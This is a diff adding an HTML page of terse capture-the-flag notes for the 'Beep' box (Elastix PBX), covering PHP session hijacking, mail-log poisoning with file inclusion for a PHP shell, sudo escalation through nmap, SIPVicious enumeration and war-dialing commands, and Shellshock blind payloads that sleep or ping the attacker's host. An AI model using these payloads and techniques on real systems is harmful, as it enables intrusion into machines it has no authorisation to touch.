@@ -1,0 +1,40 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Beep</title>
+</head><body>4 different ways, remember, sometimes there are more than one ways to "hack the box" :)<br/>
+<br/>
+elastix is PBX software<br/>
+Shortcut: CTRL + U (view source in web browser)<br/>
+<br/>
+linux lockout policy possibly in pam.d<br/>
+&nbsp;&#09;/etc/pam.d/system-auth<br/>
+&nbsp;&#09;/etc/fail2ban/fail2ban.conf<br/>
+<br/>
+<br/>
+/proc/self/status is cool. All about the current process.<br/>
+<br/>
+phpinfo() tells you where the php session is, so you can attempt to hijack<br/>
+This is typically a race condiiton /tmp_sessID<br/>
+<br/>
+poison and include /var/mail/asterix &nbsp;for phpshell<br/>
+sudo -l<br/>
+&nbsp;&#09;https://gtfobins.github.io/ - nmap, yay<br/>
+<br/>
+Does a tool fail to run due to SSL/Cert errors? Run it through Burp redirector<br/>
+&nbsp;&#09;Proxy &gt; Options &gt; Add (listener) &gt; Redirector<br/>
+<br/>
+Sipvicious:<br/>
+&nbsp;&#09;svmap &lt;ip&gt;: &#09; &#09;&#09;&#09;&#09;&#09;&#09;to ennumerate SIP device<br/>
+&nbsp;&#09;svwar -e &lt;extension_range&gt; &lt;ip&gt;:&#09;&#09;&#09;war dial for extensions<br/>
+&nbsp;&#09;svwar -e &lt;extension_range&gt; &lt;ip&gt; -m INVITE: &#09;war dial using INVITE method<br/>
+<br/>
+<br/>
+CGI files: "generally vulnerable to shellshock"<br/>
+&nbsp;&#09;Note you might never see your command being executed. Blind payloads:<br/>
+&nbsp;&#09;() { :; }; sleep 10<br/>
+&nbsp;&#09;() { :; }; /bin/ping -c 1 &lt;LHOST&gt;<br/>
+Things that run on GCI files...like webmin or others<br/>
+<br/>
+</body></html>
